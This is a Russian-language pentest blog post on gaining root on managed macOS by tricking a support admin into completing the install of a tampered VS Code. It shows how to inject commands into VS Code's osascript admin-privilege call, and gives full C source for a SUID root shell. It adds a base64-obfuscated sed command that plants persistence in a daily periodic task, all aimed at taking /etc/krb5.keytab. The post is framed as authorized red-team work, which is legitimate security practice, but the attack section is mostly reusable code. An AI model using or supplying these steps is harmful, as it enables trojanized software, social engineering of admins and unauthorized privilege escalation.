---
layout: post
title: "Abuse VS Code Installation for LPE on macOS [Pentest Awards 2023]"
date: 2024-05-19 22:00:00 +0300
author: snovvcrash
tags: [pentest-awards, xakep-ru, macos, phishing, vs-code]
---

[//]: # (2023-03-10)

Когда тебе нужно заскамить сотрудников техподдержки на угон их кред и привилегий в macOS (естественно, действуя в рамках контракта о пентесте), можно смело предлагать завершить установку легитимного ПО, которое ты предварительно кастомизировал. Для примера разберем, как это сделать с любимым всеми Visual Studio Code.

<!--cut-->

<p align="right">
  <a href="https://award.awillix.ru/2023"><img src="https://img.shields.io/badge/Awillix-Pentest%20Awards-087fff?style=flat-square" alt="award-awillix-badge.svg" /></a>
  <a href="https://xakep.ru/2023/10/03/macos-lpe/"><img src="https://img.shields.io/badge/%5d%5b-%d0%a5%d0%b0%d0%ba%d0%b5%d1%80-red?style=flat-square" alt="xakep-badge.svg" /></a>
</p>

Этот способ мы применили по заказу одного **очень** крупного российского холдинга в ходе комплексной операции Red Team. Заказчик настоял на реализации следующего сценария: нас «устраивают» в компанию по согласованной легенде как внешних сотрудников на удаленке с выданным MacBook в качестве рабочего ноута.

Так как привилегии обычных сотрудников на маках в организации сильно урезаны, обращения к техподдержке по большей части состоят из писем вроде «админ, помоги мне установить программу». Из этого родилась идея воспользоваться этой особенностью рабочего процесса для повышения привилегий на маке до рута и заполучить служебную учетку из `/etc/krb5.keytab` для развития дальнейших атак на AD.

[![banner.png](/assets/images/vs-code-lpe-macos/banner.png)](/assets/images/vs-code-lpe-macos/banner.png)
{:.center-image}

* TOC
{:toc}

# Спуфинг диалогового окна аутентификации

В паблике есть [мануал](https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/) по написанию вредоносного расширения, которое умеет само стартовать при запуске VS Code и светить назойливым окном в глаза ненавистному админу, клянча его пароль.

![![password-dialog-spoofing.png](/assets/images/vs-code-lpe-macos/password-dialog-spoofing.png)](/assets/images/vs-code-lpe-macos/password-dialog-spoofing.png)
{:.center-image}

Достоинство этого метода в том, что можно получить креды привилегированной учетки в открытом виде. Расширение пишется в пользовательскую директорию `~/.vscode`, поэтому даже если у админа стоит чистый VS Code, запуск модульного окна сохранится.

Недостаток в том, что надо поймать **очень** уставшего админа, чтобы предприятие взлетело — диалоговое окно рисуется с помощью AppleScript, поэтому выглядит весьма халтурно и серьезно отличается от встроенных окон запроса расширенных привилегий. В связи с этим мы решили найти другой способ абьюзить VS Code.

# Модификация дистрибутива VS Code

Несмотря на то, что VS Code можно запускать с привилегиями пользователя, внутри есть дополнительные функции, которые требуют прав администратора. Например, [интеграция](https://code.visualstudio.com/docs/setup/mac#_launching-from-the-command-line) команды `code` в консоль (для этого вносятся изменения в системный `PATH`). В VS Code это делается командой из Command Palette (Command-Shift-P).

Хотя разработчики Code настоятельно [не рекомендуют](https://code.visualstudio.com/api/ux-guidelines/command-palette) изменять встроенные системные команды, хакеры любят жить опасно, поэтому способ есть.

![![command-palette-do-dont.png](/assets/images/vs-code-lpe-macos/command-palette-do-dont.png)](/assets/images/vs-code-lpe-macos/command-palette-do-dont.png)
{:.center-image}

![![command-palette-install-code.png](/assets/images/vs-code-lpe-macos/command-palette-install-code.png)](/assets/images/vs-code-lpe-macos/command-palette-install-code.png)
{:.center-image}

Грепнув каталог с VS Code по строке `command in PATH`, найдем отсылку к JS-функции `installCommandLine`:

```terminal?prompt=$
$ pwd 
/Applications/Visual Studio Code.app 

$ grep -r 'command in PATH' 
./Contents/Resources/app/out/vs/workbench/workbench.desktop.main.js:... class S extends I.Action2{constructor() {super({id:"workbench.action.installCommandLine",title:{value:(0,t.localize)(1,null,L.default.applicationName),original:`Install  '${L.default.applicationName}' command in PATH`} ... 
```

Далее, грепнув по `installCommandLine`, найдем само тело исполняемой команды.

```terminal?prompt=$
$ grep -r 'installShellCommand' 
./Contents/Resources/app/out/vs/code/electron-main/main.js:... async installShellCommand(T){const{source:U,target:H}=await this.n();try{const{symbolicLink:re}=await p.SymlinkSupport.stat(U);if(re&&!re.dangling){const Y=await(0,u.realpath) (U);if(H===Y)return}await p.Promises.unlink(U)}catch(re){if(re.code!=="ENOENT")throw re}try{await p.Promises.symlink(H,U)}catch(re) {if(re.code!=="EACCES"&&re.code!=="ENOENT")throw re;const{response:Y}=await this.showMessageBox(T,{type:"info",message:(0,y.localize) (0,null,this.h.nameShort),buttons:[(0,y.localize)(1,null),(0,y.localize)(2,null)]});if(Y===0)try{const ne=`osascript -e "do shell script \\"mkdir -p /usr/local/bin && ln -sf '${H}' '${U}'\\" with administrator privileges"`;await(0,O.promisify)(E.exec) (ne)}catch{throw new Error((0,y.localize)(3,null,U))}}} ...
```

Как видишь, ничто не мешает нам добавить собственное действие к команде `osascript`, но надо придумать, что именно мы можем сделать для сохранения и последующего восстановления привилегированного доступа.

```bash
osascript -e "do shell script \\"mkdir -p /usr/local/bin && ln -sf '${H}' '${U}'\\" with administrator privileges"
```

Курс Offensive Security «EXP-312: Advanced macOS Control Bypasses» предлагает изменить настройки PAM-модуля (а именно перечня обязательных критериев при аутентификации через sudo), чтобы имперсонировать root без пароля. Это делается с помощью изменения файла настроек `/etc/pam.d/sudo`.

![![exp-312-pam.png](/assets/images/vs-code-lpe-macos/exp-312-pam.png)](/assets/images/vs-code-lpe-macos/exp-312-pam.png)
{:.center-image}

К сожалению, этот способ не взлетел в macOS 13.2.1, поскольку теперь недостаточно быть рутом, чтобы менять содержимое чувствительных файлов на диске (все, что связано с кредами и аутентификацией). Для этого у процесса, который запрашивает такие изменения, должна быть привилегия Full Disk Access, которая навешивается только через GUI.

Мы решили пойти дедовским способом и создать SUID-бинарь (благо хоть это на маке работает):

```cpp
// gcc -o suidshell suidshell.c
// ./suidshell root

#include <stdlib.h>
#include <sys/types.h>
#include <pwd.h>
#include <unistd.h>

void change_to_user(const char *szUserName)
{
    struct passwd *pw;
    pw = getpwnam(szUserName);
    if (pw != NULL)
    {
        uid_t uid = pw->pw_uid;
        if (setuid(uid) == 0) system("/bin/bash -p");
    }
}

int main(int argc, char **argv)
{
    if (argc == 1) return 1;
    for (int i = 1; i < argc; i++) change_to_user(argv[i]);
    return 0;
}
```

Теперь можно добавить веселые команды к куску кода, нагрепанному выше, чтобы навесить нужного владельца и SUID-бит на шелл:

```bash
osascript -e "do shell script \\"chown root:wheel /tmp/suidshell && chmod u+s /tmp/suidshell && mkdir -p /usr/local/bin && ln -sf  '${H}' '${U}'\\" with administrator privileges" 
```

Еще немного покопавшись, мы открыли другую интересную возможность — вместо того, чтобы класть SUID-бинарь на диск непосредственно перед фишингом, можно добавить команды выше к задаче `/etc/periodic/daily/110.clean-tmps`, которая выполняется ежедневно:

```bash
sed -i '' -e 's/exit \$rc/chown root:wheel \/tmp\/\suidshell \&\& chmod u+s \/tmp\/\suidshell\nexit \$rc/' /etc/periodic/daily/110.clean-tmps

osascript -e "do shell script \\" echo 
c2VkIC1pICcnIC1lICdzL2V4aXQgXCRyYy9jaG93biByb290OndoZWVsIFwvdG1wXC9cc3VpZHNoZWxsIFwmXCYgY2htb2QgdStzIFwvdG1wXC9cc3VpZHNoZWxsXG5leGl0IF wkcmMvJyAvZXRjL3BlcmlvZGljL2RhaWx5LzExMC5jbGVhbi10bXBz | base64 -d | sh && mkdir -p /usr/local/bin && ln -sf '${H}' '${U}'\\" with administrator privileges"
```

Так можно дифференцировать ход LPE: сначала отредактировать запускаемую по расписанию задачу, а потом принести SUID-шелл и дожидаться его повышения.

![![before-elevation.png](/assets/images/vs-code-lpe-macos/before-elevation.png)](/assets/images/vs-code-lpe-macos/before-elevation.png)
{:.center-image}

До выполнения скам-команды
{:.quote}

![![elevation.png](/assets/images/vs-code-lpe-macos/elevation.png)](/assets/images/vs-code-lpe-macos/elevation.png)
{:.center-image}

Выполнение скам-команды
{:.quote}

![![after-elevation.png](/assets/images/vs-code-lpe-macos/after-elevation.png)](/assets/images/vs-code-lpe-macos/after-elevation.png)
{:.center-image}

После выполнения скам-команды
{:.quote}

В результате получаем нативное диалоговое окно для запроса повышения привилегий. Пожалуй, это перевешивает все недостатки. Какие? Увы, так нельзя утащить пароль админа в виде текста, к тому же нужно класть на диск дополнительный бинарь, что может вызвать срабатывание мониторинга, если он используется. И, конечно, если админ притащит свой экземпляр VS Code, жмем F to pay respects.

# Вывод

Прикинувшись беспомощным юзером, полностью находящимся во власти всемогущего админа (то есть сотрудника техподдержки), можно чужими руками «бесплатно» повысить себе локальные привилегии на макбуке и потенциально разжиться дополнительными доступами. GGWP!
